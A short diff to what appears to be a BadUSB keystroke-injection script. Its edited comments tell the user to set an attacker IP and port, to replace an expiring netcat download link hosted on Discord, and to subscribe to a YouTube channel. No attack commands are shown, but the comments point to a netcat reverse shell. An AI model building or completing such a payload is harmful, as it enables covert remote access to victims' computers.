@@ -1,5 +1,6 @@
-REM Change The IP and the Port, and for the netcat download link you can use it but it sure will expired so change it
-REM subscribe to my YouTube channel https://www.youtube.com/channel/UCL5HhLmJ7gSkf9zQu39LRoQ (dont really post anything related to this tho xD)
+REM Change The IP and the Port, and for the netcat download link you can use it but it sure will expired so change it (the link you need to change is the discord link if it-
+REM expired if the link is still available you still can use that
+REM Subscribe to my YouTube channel https://www.youtube.com/channel/UCL5HhLmJ7gSkf9zQu39LRoQ (dont really post anything related to this tho xD)
 REM for the ip address and the port pls do remove this symbol (<>) 
 
 DELAY 1000
